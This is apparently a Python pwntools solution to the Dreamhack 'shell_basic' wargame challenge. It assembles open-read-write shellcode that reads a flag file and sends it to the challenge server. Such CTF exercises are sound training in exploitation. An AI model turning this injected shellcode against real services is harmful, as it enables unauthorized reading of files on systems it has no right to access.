#!/usr/bin/python3
from pwn import *

context.log_level = 'debug'
p = remote('host3.dreamhack.games', 11531)

context.arch = 'amd64'
flag = '/home/shell_basic/flag_name_is_loooooong'

# open('/home/shell_basic/flag_name_is_loooooong')
shellcode = shellcraft.open(flag)
# read(fd, buf, 0x30)
shellcode += shellcraft.read('rax', 'rsp', 0x30) 
# write(stdout, buf, 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)

shellcode = asm(shellcode)

p.sendlineafter('shellcode: ', shellcode)
print(p.recv())
